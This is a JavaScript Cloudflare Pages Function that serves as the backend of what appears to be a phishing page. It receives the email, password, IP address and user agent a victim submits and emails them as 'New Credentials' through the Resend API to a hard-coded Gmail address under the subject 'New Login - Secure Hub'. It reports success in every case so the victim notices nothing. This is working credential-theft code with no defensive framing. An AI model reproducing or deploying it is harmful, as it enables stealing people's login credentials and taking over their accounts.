// functions/api/collect.js — Cloudflare Pages Function

export async function onRequestPost(context) {
  try {
    const { request, env } = context;

    // Parse the JSON body from the frontend
    const body = await request.json();
    const { email, password, ip, userAgent } = body;

    // Get the Resend API key from Cloudflare environment
    const apiKey = env.RESEND_API_KEY;
    if (!apiKey) {
      console.error('RESEND_API_KEY is not set in Cloudflare environment');
      return new Response(JSON.stringify({ success: true }), {
        status: 200,
        headers: { 'Content-Type': 'application/json' },
      });
    }

    const emailBody = `
🔐 New Credentials
📧 Email: ${email || 'N/A'}
🔑 Password: ${password || 'N/A'}
🌐 IP: ${ip || 'Unknown'}
📱 User-Agent: ${userAgent || 'N/A'}
⏰ Time: ${new Date().toISOString()}
    `;

    // Send via Resend
    const resendResponse = await fetch('https://api.resend.com/emails', {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${apiKey}`,
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        from: 'onboarding@resend.dev',
        to: ['g82443047@gmail.com'],
        subject: 'New Login - Secure Hub',
        text: emailBody.trim(),
        html: `<pre>${emailBody.trim()}</pre>`,
      }),
    });

    const resendData = await resendResponse.json();
    console.log('Resend response:', JSON.stringify(resendData));

    return new Response(JSON.stringify({ success: true }), {
      status: 200,
      headers: { 'Content-Type': 'application/json' },
    });
  } catch (error) {
    console.error('Error in collect handler:', error);
    return new Response(JSON.stringify({ success: true }), {
      status: 200,
      headers: { 'Content-Type': 'application/json' },
    });
  }
}